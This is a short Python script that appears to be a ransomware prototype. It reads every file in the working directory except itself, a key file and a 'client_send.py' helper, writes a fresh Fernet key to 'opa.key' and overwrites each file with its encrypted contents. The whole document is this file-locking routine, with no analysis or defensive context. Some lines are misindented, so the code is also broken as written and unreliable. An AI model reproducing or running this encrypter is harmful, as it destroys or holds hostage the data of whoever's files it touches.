import os

from cryptography.fernet import Fernet
files=[]

def encrypter(files):
    key = Fernet.generate_key()


    for file in os.listdir():
        if file=="test1.py" or file== "opa.key" or file == "client_send.py":
            continue
        if os.path.isfile(file):
            files.append(file)

    print(files)


    with open("opa.key", "wb") as keykey:
        keykey.write(key)


    for file in files:
        with open(file, "rb") as oda:
            atta = oda.read()
         atto_01 = Fernet(key).encrypt(atta)
        with open(file, "wb") as oda:
             oda.write(atto_01)







        
        
    
    
